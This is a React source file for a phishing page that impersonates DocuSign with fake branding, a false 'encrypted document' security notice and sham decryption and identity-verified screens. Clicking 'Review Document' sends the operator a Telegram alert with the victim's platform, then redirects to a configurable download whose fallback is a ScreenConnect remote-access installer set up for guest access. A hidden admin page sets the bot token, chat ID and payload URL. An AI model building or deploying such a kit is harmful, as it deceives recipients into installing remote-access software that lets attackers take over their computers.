/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect, FormEvent } from 'react';
import { 
  FileText, 
  Loader2,
  CheckCircle2,
  ShieldCheck,
  PenLine,
  Settings,
  Save,
  ArrowLeft,
  ExternalLink,
  Bot,
  MessageSquare
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

// --- Admin Component ---
function AdminPage() {
  const [settings, setSettings] = useState({
    bot_token: '',
    chat_id: '',
    redirect_url: ''
  });
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [message, setMessage] = useState({ type: '', text: '' });

  useEffect(() => {
    fetch('/api/settings')
      .then(res => res.json())
      .then(data => {
        setSettings({
          bot_token: data.bot_token || '',
          chat_id: data.chat_id || '',
          redirect_url: data.redirect_url || ''
        });
        setLoading(false);
      })
      .catch(err => {
        console.error(err);
        setLoading(false);
      });
  }, []);

  const handleSave = async (e: FormEvent) => {
    e.preventDefault();
    setSaving(true);
    setMessage({ type: '', text: '' });

    try {
      const res = await fetch('/api/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(settings)
      });

      if (res.ok) {
        setMessage({ type: 'success', text: 'Settings saved successfully!' });
      } else {
        setMessage({ type: 'error', text: 'Failed to save settings.' });
      }
    } catch (err) {
      setMessage({ type: 'error', text: 'An error occurred.' });
    } finally {
      setSaving(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-50">
        <Loader2 className="animate-spin text-blue-600" size={48} />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50 p-4 md:p-8 font-sans">
      <div className="max-w-2xl mx-auto">
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <div className="bg-slate-800 p-2 rounded-lg">
              <Settings className="text-white" size={24} />
            </div>
            <h1 className="text-2xl font-bold text-slate-800">Admin Settings</h1>
          </div>
          <a 
            href="/" 
            className="flex items-center gap-2 text-sm font-medium text-slate-600 hover:text-blue-600 transition-colors"
          >
            <ArrowLeft size={16} />
            Back to App
          </a>
        </div>

        <form onSubmit={handleSave} className="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden">
          <div className="p-6 border-b border-slate-100">
            <h2 className="text-lg font-semibold text-slate-800 mb-1">Telegram Notifications</h2>
            <p className="text-sm text-slate-500">Configure your bot to receive download alerts.</p>
          </div>
          
          <div className="p-6 space-y-6">
            <div className="space-y-2">
              <label className="flex items-center gap-2 text-sm font-medium text-slate-700">
                <Bot size={16} className="text-slate-400" />
                Bot Token
              </label>
              <input 
                type="text"
                value={settings.bot_token}
                onChange={e => setSettings({...settings, bot_token: e.target.value})}
                placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
                className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
              />
            </div>

            <div className="space-y-2">
              <label className="flex items-center gap-2 text-sm font-medium text-slate-700">
                <MessageSquare size={16} className="text-slate-400" />
                Chat ID
              </label>
              <input 
                type="text"
                value={settings.chat_id}
                onChange={e => setSettings({...settings, chat_id: e.target.value})}
                placeholder="-100123456789"
                className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
              />
            </div>

            <div className="pt-6 border-t border-slate-100">
              <h2 className="text-lg font-semibold text-slate-800 mb-1">Download Configuration</h2>
              <p className="text-sm text-slate-500 mb-4">Set the destination URL for the download button.</p>
              
              <div className="space-y-2">
                <label className="flex items-center gap-2 text-sm font-medium text-slate-700">
                  <ExternalLink size={16} className="text-slate-400" />
                  Redirect URL
                </label>
                <input 
                  type="url"
                  value={settings.redirect_url}
                  onChange={e => setSettings({...settings, redirect_url: e.target.value})}
                  placeholder="https://example.com/file.msi"
                  className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
                />
              </div>
            </div>
          </div>

          <div className="p-6 bg-slate-50 border-t border-slate-100 flex items-center justify-between">
            <div>
              {message.text && (
                <p className={`text-sm font-medium ${message.type === 'success' ? 'text-emerald-600' : 'text-red-600'}`}>
                  {message.text}
                </p>
              )}
            </div>
            <button 
              type="submit"
              disabled={saving}
              className="flex items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white px-6 py-2.5 rounded-lg font-semibold transition-all disabled:opacity-50 shadow-sm"
            >
              {saving ? <Loader2 className="animate-spin" size={18} /> : <Save size={18} />}
              Save Settings
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

// --- Main App Component ---
export default function App() {
  const [status, setStatus] = useState<'initial' | 'loading' | 'success'>('initial');
  const [countdown, setCountdown] = useState(5);
  const [redirectUrl, setRedirectUrl] = useState('');
  const [isAdmin, setIsAdmin] = useState(window.location.hash === '#/admin');

  useEffect(() => {
    const handleHashChange = () => {
      setIsAdmin(window.location.hash === '#/admin');
    };
    window.addEventListener('hashchange', handleHashChange);
    
    // Fetch settings to get redirect URL
    fetch('/api/settings')
      .then(res => res.json())
      .then(data => {
        if (data.redirect_url) {
          setRedirectUrl(data.redirect_url);
        }
      })
      .catch(err => console.error('Failed to fetch settings:', err));

    return () => window.removeEventListener('hashchange', handleHashChange);
  }, []);

  const handleDownload = async () => {
    setStatus('loading');
    setCountdown(5);

    // Send Telegram Notification
    try {
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `<b>🔔 DocuSign Review Alert</b>\n\nRecipient has clicked to view/download <code>DOCUMENT.pdf</code>.\n\n<b>Time:</b> ${new Date().toLocaleString()}\n<b>Platform:</b> ${navigator.platform}`
        })
      });
    } catch (error) {
      console.error('Failed to send notification:', error);
    }

    // Redirect to the dynamic URL from settings
    if (redirectUrl) {
      window.location.href = redirectUrl;
    } else {
      // Fallback
      window.location.href = "https://professionalgfx.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
    }
  };

  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (status === 'loading') {
      if (countdown > 0) {
        timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      } else {
        setStatus('success');
      }
    }
    return () => clearTimeout(timer);
  }, [status, countdown]);

  if (isAdmin) {
    return <AdminPage />;
  }

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex items-center justify-center p-4 font-sans relative">
      {/* Hidden Admin Link (Bottom Right) */}
      <a 
        href="#/admin" 
        className="absolute bottom-4 right-4 text-slate-300 hover:text-slate-400 transition-colors"
        title="Admin Settings"
      >
        <Settings size={16} />
      </a>

      <motion.div 
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-[520px] bg-white rounded-sm shadow-[0_2px_10px_rgba(0,0,0,0.1)] overflow-hidden"
      >
        {/* DocuSign Header */}
        <div className="bg-white border-b border-slate-200 p-6 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="bg-[#005cb9] p-1.5 rounded-sm">
              <PenLine size={24} className="text-white" />
            </div>
            <span className="text-[#333] text-2xl font-bold tracking-tight">DocuSign</span>
          </div>
          <div className="flex items-center gap-2 text-slate-500 text-xs font-medium uppercase tracking-wider">
            <ShieldCheck size={16} className="text-[#005cb9]" />
            Secure
          </div>
        </div>

        <div className="p-8 flex flex-col items-center text-center">
          {/* Heading */}
          <h1 className="text-2xl font-semibold text-[#333] mb-2">
            Please Review & Act on Your Document
          </h1>
          <p className="text-slate-600 text-sm mb-8">
            Shared via DocuSign Secure Cloud
          </p>

          {/* File Card */}
          <div className="w-full border border-slate-200 rounded-sm p-5 flex items-center gap-5 mb-8 bg-slate-50 text-left">
            <div className="bg-white p-3 shadow-sm border border-slate-100 rounded-sm">
              <FileText size={42} className="text-[#005cb9]" />
            </div>
            <div className="flex flex-col">
              <span className="text-lg font-bold text-[#333]">DOCUMENT.pdf</span>
              <span className="text-xs text-slate-500 uppercase tracking-tighter">PDF Document • 1.2 MB</span>
            </div>
          </div>

          <AnimatePresence mode="wait">
            {status === 'initial' && (
              <motion.div 
                key="initial"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="w-full flex flex-col items-center"
              >
                <div className="bg-blue-50 border-l-4 border-[#005cb9] p-4 mb-8 w-full text-left">
                  <p className="text-[#005cb9] text-xs font-bold uppercase mb-1">Security Notice</p>
                  <p className="text-slate-700 text-sm">
                    This document is encrypted and requires a desktop environment for secure viewing and signing.
                  </p>
                </div>

                <button 
                  onClick={handleDownload}
                  className="w-full bg-[#ffcc00] hover:bg-[#ebbc00] text-[#333] font-bold py-4 rounded-sm transition-all shadow-md text-lg uppercase tracking-wide"
                >
                  Review Document
                </button>
                
                <p className="mt-6 text-xs text-slate-400">
                  By clicking 'Review Document', you agree to the Electronic Record and Signature Disclosure.
                </p>
              </motion.div>
            )}

            {status === 'loading' && (
              <motion.div 
                key="loading"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="w-full flex flex-col items-center"
              >
                <div className="w-full bg-slate-100 h-1.5 rounded-full overflow-hidden mb-8">
                  <motion.div 
                    initial={{ width: 0 }}
                    animate={{ width: "100%" }}
                    transition={{ duration: 5, ease: "linear" }}
                    className="bg-[#005cb9] h-full"
                  />
                </div>

                <div className="flex flex-col items-center gap-4">
                  <Loader2 size={48} className="text-[#005cb9] animate-spin" />
                  <div className="space-y-1">
                    <p className="text-[#333] font-medium">Establishing Secure Connection...</p>
                    <p className="text-slate-500 text-sm">Decryption in progress ({countdown}s)</p>
                  </div>
                </div>
              </motion.div>
            )}

            {status === 'success' && (
              <motion.div 
                key="success"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="w-full flex flex-col items-center"
              >
                <div className="bg-emerald-50 text-emerald-700 p-6 rounded-sm border border-emerald-100 mb-6 w-full flex items-start gap-3 text-left">
                  <CheckCircle2 size={24} className="shrink-0" />
                  <div>
                    <p className="font-bold text-lg">Identity Verified</p>
                    <p className="text-sm opacity-90">Your secure document session has been initialized. The file is downloading now.</p>
                  </div>
                </div>
                <button 
                  onClick={() => setStatus('initial')}
                  className="text-sm text-[#005cb9] font-medium hover:underline"
                >
                  Return to document overview
                </button>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Footer */}
          <div className="mt-12 pt-6 border-t border-slate-100 w-full flex flex-col items-center gap-4">
            <div className="flex items-center gap-6 text-[11px] text-slate-400 font-medium uppercase tracking-widest">
              <a href="#" className="hover:text-[#005cb9] transition-colors">Terms of Use</a>
              <a href="#" className="hover:text-[#005cb9] transition-colors">Privacy Policy</a>
              <a href="#" className="hover:text-[#005cb9] transition-colors">Intellectual Property</a>
            </div>
            <p className="text-[10px] text-slate-300">
              © DocuSign Inc. 2026. All rights reserved.
            </p>
          </div>
        </div>
      </motion.div>
    </div>
  );
}
